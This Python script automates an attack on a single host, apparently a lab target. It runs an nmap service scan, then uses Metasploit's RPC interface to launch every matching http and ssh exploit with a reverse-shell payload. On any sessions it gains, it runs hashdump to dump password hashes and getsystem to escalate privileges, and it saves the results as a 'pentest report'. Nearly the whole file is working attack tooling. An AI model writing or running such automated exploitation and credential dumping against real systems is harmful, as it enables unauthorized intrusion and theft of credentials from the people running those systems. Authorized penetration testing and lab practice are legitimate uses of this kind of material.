import nmap
import logging
import time
from pymetasploit3.msfrpc import MsfRpcClient, MsfAuthError, MsfRpcError
from retrying import retry
import json

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Nmap scanner
nm = nmap.PortScanner()

# Scan the target host
target_host = "10.10.11.23"
logger.info(f"Scanning target host: {target_host}")
nm.scan(target_host, arguments="-sV")

# Initialize Metasploit RPC client
try:
    client = MsfRpcClient(password="", username="", port=55553, server="127.0.0.1")
except (MsfAuthError, MsfRpcError) as e:
    logger.error(f"Metasploit RPC connection failed: {e}")
    exit(1)

@retry(stop_max_attempt_number=3, wait_fixed=5000)
def run_exploit(exploit_module, target, port):
    try:
        logger.info(f"Running exploit {exploit_module['name']} against {target}:{port}")
        return exploit_module.execute(payload='generic/shell_reverse_tcp')
    except Exception as e:
        logger.error(f"Error running exploit {exploit_module['fullname']} on {target}:{port}: {e}")

# Automate exploit search and execution
exploits_attempted = []

for host in nm.all_hosts():
    for port in nm[host]['tcp']:
        service = nm[host]['tcp'][port]['name']
        logger.info(f"Service {service} found on port {port}")
        
        if service in ["http", "ssh"]:
            search_results = client.modules.search(service)
            for result in search_results:
                if result['type'] == 'exploit':
                    exploit_module = client.modules.use('exploit', result['fullname'])
                    exploit_module['RHOSTS'] = target_host
                    exploit_module['RPORT'] = port
                    try:
                        exploit_result = run_exploit(exploit_module, target_host, port)
                        exploits_attempted.append({
                            "exploit": result['fullname'],
                            "result": exploit_result
                        })
                        logger.info(f"Exploit result: {exploit_result}")
                    except Exception as e:
                        logger.error(f"Error running exploit {result['fullname']} on {target_host}:{port}: {e}")
                    time.sleep(5)

# Post-exploitation tasks
meterpreter_sessions = client.sessions.list
post_exploitation_results = {}

for session_id, session_info in meterpreter_sessions.items():
    if session_info['type'] == 'meterpreter':
        session = client.sessions.session(session_id)
        logger.info(f"Running post-exploitation tasks on session {session_id}")
        
        system_info = session.run_with_output('sysinfo')
        logger.info(f"System Info: {system_info}")
        
        password_dump = session.run_with_output('hashdump')
        logger.info(f"Password Dump: {password_dump}")

        priv_esc_result = session.run_with_output('post/windows/escalate/getsystem')
        logger.info(f"Privilege Escalation Result: {priv_esc_result}")

        post_exploitation_results[session_id] = {
            "system_info": system_info,
            "password_dump": password_dump,
            "privilege_escalation": priv_esc_result
        }

# Generate report
report = {
    "target": target_host,
    "services": nm[target_host]['tcp'],
    "exploits_attempted": exploits_attempted,
    "post_exploitation": post_exploitation_results
}

# Save report as JSON
with open('pentest_report.json', 'w') as report_file:
    json.dump(report, report_file, indent=4)

logger.info("Penetration test completed. Report saved as pentest_report.json.")
